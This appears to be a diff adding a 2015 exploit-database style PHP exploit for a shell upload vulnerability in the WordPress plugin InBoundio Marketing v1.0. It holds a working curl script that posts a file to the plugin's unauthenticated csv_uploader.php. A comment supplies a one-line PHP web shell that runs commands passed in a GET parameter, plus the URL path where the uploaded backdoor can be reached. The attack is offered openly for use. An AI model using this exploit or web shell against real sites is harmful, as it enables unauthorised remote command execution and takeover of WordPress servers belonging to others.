@@ -1,0 +1,92 @@
+<?php
+###########################################
+#-----------------------------------------#
+#[ 0-DAY Aint DIE | No Priv8 | KedAns-Dz ]#
+#-----------------------------------------#
+#     *----------------------------*      #
+#  K  |....##...##..####...####....|  .   #
+#  h  |....#...#........#..#...#...|  A   #
+#  a  |....#..#.........#..#....#..|  N   #
+#  l  |....###........##...#.....#.|  S   #
+#  E  |....#.#..........#..#....#..|  e   #
+#  D  |....#..#.........#..#...#...|  u   #
+#  .  |....##..##...####...####....|  r   #
+#     *----------------------------*      #
+#-----------------------------------------#
+#[ Copyright (c) 2015 | Dz Offenders Cr3w]#
+#-----------------------------------------#
+###########################################
+# >>    D_x . Made In Algeria . x_Z    << #
+###########################################
+#
+# [>] Title : WordPress plugin (InBoundio Marketing) Shell Upload Vulnerability
+#
+# [>] Author : KedAns-Dz
+# [+] E-mail : ked-h (@hotmail.com)
+# [+] FaCeb0ok : fb.me/K3d.Dz
+# [+] TwiTter : @kedans
+#
+# [#] Platform : PHP / WebApp
+# [+] Cat/Tag : File Upload / Code Exec
+#
+# [<] <3 <3 Greetings t0 Palestine <3 <3
+# [!] Vendor : http://www.inboundio.com
+#
+###########################################
+#
+# [!] Description :
+#
+# Wordpress plugin InBoundio Marketing v1.0 is suffer from File/Shell Upload Vulnerability
+# remote attacker can upload file/shell/backdoor and exec commands.
+#
+####
+# Lines (6... to 20) : csv_uploader.php
+####
+#
+# ExpLO!T : 
+# -------
+
+$postData = array();
+$postData[ 'file' ] = "@k3dz.php"; #Shell_2_Exec ;)
+
+$dz = curl_init();
+curl_setopt($dz, CURLOPT_URL, "http://[Target]/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php");
+curl_setopt($dz, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+curl_setopt($dz, CURLOPT_POST, 1);
+curl_setopt($dz, CURLOPT_POSTFIELDS, $postData );
+curl_setopt($dz, CURLOPT_TIMEOUT, 0);
+$buf = curl_exec ($dz);
+curl_close($dz);
+unset($dz);
+echo $buf;
+
+/*
+[!] creat your shell file =>
+ _ k3dz.php :
+
+ <?php system($_GET['dz']); ?>
+ 
+[>] Post the exploit 
+[+] Find you'r backdoor : ../inboundio-marketing/admin/partials/uploaded_csv/k3dz.php?dz=[ CMD ]
+[+] Or upload what you whant ^_^ ...
+
+*/
+
+####
+#  <! THE END ^_* ! , Good Luck all <3 | 0-DAY Aint DIE ^_^ !>
+#  Hassi Messaoud (30500) , 1850 city/hood si' elHaouass .<3
+#---------------------------------------------------------------
+# Greetings to my Homies : Meztol-Dz , Caddy-Dz , Kalashinkov3 , 
+# Chevr0sky , Mennouchi.Islem , KinG Of PiraTeS , TrOoN , T0xic,
+# & Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz , Barbaros-DZ , &
+# & KnocKout , Angel Injection , The Black Divels , kaMtiEz  , &
+# & Evil-Dz , Elite_Trojan , MalikPc , Marvel-Dz , Shinobi-Dz, &
+# & Keystr0ke , JF , r0073r , CroSs , Inj3ct0r/Milw0rm 1337day & 
+# PacketStormSecurity * Metasploit * OWASP * OSVDB * CVE Mitre ;
+####
+
+# REF : http://k3dsec.blogspot.com/2015/03/wordpress-plugin-inboundio-marketing.html
+
+?>
+
+
